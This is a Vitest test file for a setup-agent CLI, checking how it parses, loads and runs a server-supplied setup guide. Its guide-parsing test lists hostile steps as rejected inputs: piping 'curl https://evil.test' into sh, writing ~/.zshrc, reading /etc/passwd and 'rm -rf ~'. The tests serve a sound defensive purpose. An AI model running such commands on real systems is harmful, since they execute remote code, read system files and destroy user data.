import { describe, expect, it, onTestFinished, vi } from "vitest";
import type { connectCheckout } from "./client";
import { main } from "./cli";
import { loadGuide, parseGuide, renderText } from "./guide";
import { initialCheckoutState } from "./protocol";
import { testGuide } from "./tests/guide-fixture";

const { connectCheckoutMock } = vi.hoisted(() => ({
  connectCheckoutMock: vi.fn<typeof connectCheckout>(),
}));
vi.mock("./client", async (importOriginal) => ({
  ...(await importOriginal<typeof import("./client")>()),
  connectCheckout: connectCheckoutMock,
}));

const URL = "https://checkout.test/link";
const CONTEXT = { started: "user", opened: true } as const;
const serve = (response: () => Response | Promise<Response>) => {
  const fetch = vi.fn(async () => response());
  vi.stubGlobal("fetch", fetch);
  return fetch;
};
const withIntro = (intro: unknown[]) => ({ ...testGuide, intro });

describe("parseGuide", () => {
  it("accepts a guide of texts and allowed steps", () => {
    expect(parseGuide(JSON.parse(JSON.stringify(testGuide)))).toEqual(
      testGuide,
    );
  });

  it("rejects an action outside the CLI's fixed set, or with arguments it does not take", () => {
    for (const step of [
      { action: "exec", command: "curl https://evil.test | sh" },
      { action: "write-file", path: "~/.zshrc" },
      { action: "print-status", file: "/etc/passwd" },
      { action: "print", text: "Run rm -rf ~" },
      "print",
    ])
      expect(() => parseGuide(withIntro([step]))).toThrow(
        "an action this CLI does not run",
      );
  });

  it("rejects another protocol or a missing text", () => {
    expect(() => parseGuide({ ...testGuide, protocol: 2 })).toThrow(
      "not protocol 1",
    );
    const { briefing: _, ...texts } = testGuide.texts;
    expect(() => parseGuide({ ...testGuide, texts })).toThrow('no "briefing"');
  });

  it("strips control characters and bidi overrides from texts", () => {
    const guide = parseGuide({
      ...testGuide,
      texts: { ...testGuide.texts, "done.next": "a\u001b]0;x\u0007b\r‮c\nd" },
    });
    expect(guide.texts["done.next"]).toBe("a]0;xbc\nd");
  });

  it("fills placeholders once, never reading a value for more", () => {
    expect(
      renderText(testGuide, "need.product.add", { product: "{{cmd}}" }),
    ).toBe("[need.product.add] {{cmd}}");
  });
});

describe("loadGuide", () => {
  it("asks the setup URL for its protocol and refuses redirects", async () => {
    const fetch = serve(() => Response.json(testGuide));
    await loadGuide(URL, CONTEXT);
    expect(fetch).toHaveBeenCalledWith(
      `${URL}/guide?protocol=1&started=user&opened=1`,
      expect.objectContaining({ redirect: "error" }),
    );
  });

  it("fails clearly offline: setup is online-only", async () => {
    serve(() => {
      throw new TypeError("fetch failed");
    });
    await expect(loadGuide(URL, CONTEXT)).rejects.toThrow(
      `Setup needs internet access to ${URL}`,
    );
    serve(() => new Response("Not found", { status: 404 }));
    await expect(loadGuide(URL, CONTEXT)).rejects.toThrow(
      "Setup needs internet access",
    );
  });

  it("tells an outdated CLI to update, and refuses an oversized or unusable guide", async () => {
    serve(() => Response.json({ supported: [2] }, { status: 426 }));
    await expect(loadGuide(URL, CONTEXT)).rejects.toThrow(
      "run the latest setup-agent",
    );
    serve(() => Response.json({ supported: [] }, { status: 426 }));
    await expect(loadGuide(URL, CONTEXT)).rejects.toThrow(
      "newer than the setup server",
    );
    serve(() => new Response("x".repeat(300 * 1024)));
    await expect(loadGuide(URL, CONTEXT)).rejects.toThrow("too large");
    serve(() => Response.json(withIntro([{ action: "exec" }])));
    await expect(loadGuide(URL, CONTEXT)).rejects.toThrow("cannot use");
  });
});

describe("setup-agent <url>", () => {
  const run = async () => {
    const calls: string[] = [];
    connectCheckoutMock.mockResolvedValue({
      state: { ...initialCheckoutState(), status: "planning" },
      subscribe: () => () => {},
      commands: new Proxy(
        {},
        { get: (_, name: string) => async () => void calls.push(name) },
      ),
      dispose: vi.fn(),
    } as unknown as Awaited<ReturnType<typeof connectCheckout>>);
    const stdout = vi.spyOn(process.stdout, "write").mockReturnValue(true);
    const stderr = vi.spyOn(process.stderr, "write").mockReturnValue(true);
    const exit = vi.spyOn(process, "exit").mockImplementation(() => {
      throw new Error("exit");
    });
    onTestFinished(() => {
      stdout.mockRestore();
      stderr.mockRestore();
      exit.mockRestore();
      connectCheckoutMock.mockReset();
    });
    await main([URL]).catch(() => {});
    return {
      calls,
      out: stdout.mock.calls.map(([text]) => String(text)).join(""),
      err: stderr.mock.calls.map(([text]) => String(text)).join(""),
    };
  };

  it("prints the server's briefing with its own command and URL, in the server's order", async () => {
    serve(() =>
      Response.json({
        ...withIntro([{ action: "print", text: "briefing" }]),
        texts: {
          ...testGuide.texts,
          briefing: "Fixed on the server: {{cmd}} {{url}} stream\n",
        },
      }),
    );
    const t = await run();
    expect(t.out).toBe(`Fixed on the server: npx setup-agent ${URL} stream\n`);
    expect(t.calls).toEqual([]);
  });

  it("fails with one clear error when the server is unreachable", async () => {
    serve(() => {
      throw new TypeError("fetch failed");
    });
    const t = await run();
    expect(t.out).toBe("");
    expect(t.err).toBe(`setup-agent: Setup needs internet access to ${URL}\n`);
  });
});
